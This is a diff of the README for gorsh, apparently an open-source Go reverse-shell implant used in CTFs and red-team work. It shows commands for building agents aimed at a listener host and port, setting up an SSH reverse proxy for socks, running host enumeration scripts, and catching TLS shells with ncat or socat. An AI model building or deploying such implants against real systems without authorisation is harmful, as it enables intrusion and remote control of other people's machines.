@@ -13,12 +13,6 @@
 
 Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)
 
-## Motivation
-
-Learn go.  
-Make a throwaway reverse shell for things like CTFs.  
-Learn about host-based OPSEC considerations when writing an implant.
-
 ## Fork Changes
 
 **Requires go1.11+**
@@ -27,24 +21,17 @@ See the [Changelog](./docs/CHANGELOG.md)
 
 ## Getting started
 
-Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
-with Go and setting up your Golang environment (with the `$GOPATH` environment variable).
-
-
 ```bash
-go get -u github.com/gobuffalo/packr/packr
-go get github.com/audibleblink/gorsh/...
 git clone git@github.com:audibleblink/gorsh.git
 cd gorsh
+go get -u github.com/gobuffalo/packr/packr
 ```
 
-Makefile assumes this project is being built on Linux.
+**Be sure to read the Makefile**. It gives you a good idea of what's going on.
 
-Be sure to read the Makefile. It gives you a good idea of what's going on.
-If enabled in `Makefile`, the `zipcat` cmdlet uses the zStandard compression library which requires
-`cgo` compilation.
-Leave the defaults in the Makefile unless you're familiar with cross-compilation and cgo and have
-the toolchains for it, or read [here](./docs/TROUBLESHOOTING.md) if you're feeling adventurous.
+Using the zstd build tag and windll make target require cgo.
+Make sure you're familiar with cross-compilation and cgo and have the toolchains for it, or read
+[here](./docs/TROUBLESHOOTING.md) if you're feeling adventurous.
 
 ### Usage
 
@@ -54,27 +41,23 @@ First, generate your certs and ssh keys for the reverse proxy.
 $ make depends
 ```
 
-If you want to use the `socks` feature, edit `configs/ssh.json`. Create a user on the SSH server
-and give it a `/bin/false` shell in `/etc/passwd`
+Follow the make command's printed instructions on creating an ssh user for the reverse proxy connection.
 
-For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
+**Create** `configs/ssh.json`. There's an example json file the `configs` directory.
 
-Generate with:
+Generate agents with:
 
 ```bash
+# For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
 $ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
-#or
-$ make all LHOST=example.com LPOST=443
 ```
 
-### Enumeration Scripts
+#### Enumeration Scripts
 
 The `enum` command will present a selection dialog that allows once to run enumeration scripts based
 on the host OS. You can update scripts in `scripts/prepare_enum_scripts.sh` and run 
 `make enumscripts`. Addition of scripts will require modification of
 `./internal/enum/enum_{windows,linux}.go`
-
-[Troubleshooting](./docs/TROUBLESHOOTING.md)
 
 
 #### Catching the shell
@@ -99,7 +82,7 @@ need to start multiple servers on different ports.
 
 To have the ability to receive multiple shells on the same port, there's the `make listen` target.
 The `make listen` target kicks off a socat TLS pipe and creates new tmux windows with each new
-incomgin connection.  Feed it a port number as PORT. 
+incoming connection.  Feed it a port number as PORT. 
 `socat` is essentially acting as a TLS-terminating reverse proxy. The incoming connections are then
 handed off to gorsh-listener through randomly generated Unix Domain Sockets.
 
@@ -124,11 +107,9 @@ $ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
 $ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
 ```
 
-Once executed, you will be provided with the tool's shell.
-Type `help` to show what commands are supported.
-
 ## Credits
 
-* Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
+* Initial Work - [@lesnuages](https://github.com/lesnuages)
 * Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
-* mzpqnxow for figuring out my x-compilation and dependancy problems and troubleshooting guide
+* [@mzpqnxow](https://github.com/mzpqnxow) for figuring out my x-compilation and dependancy problems and troubleshooting guide
+* Enumeration scripts courtesy of [@411hall](https://twitter.com/411hall) [@harmj0y](https://twitter.com/harmj0y) [@rebootuser](https://twitter.com/rebootuser)
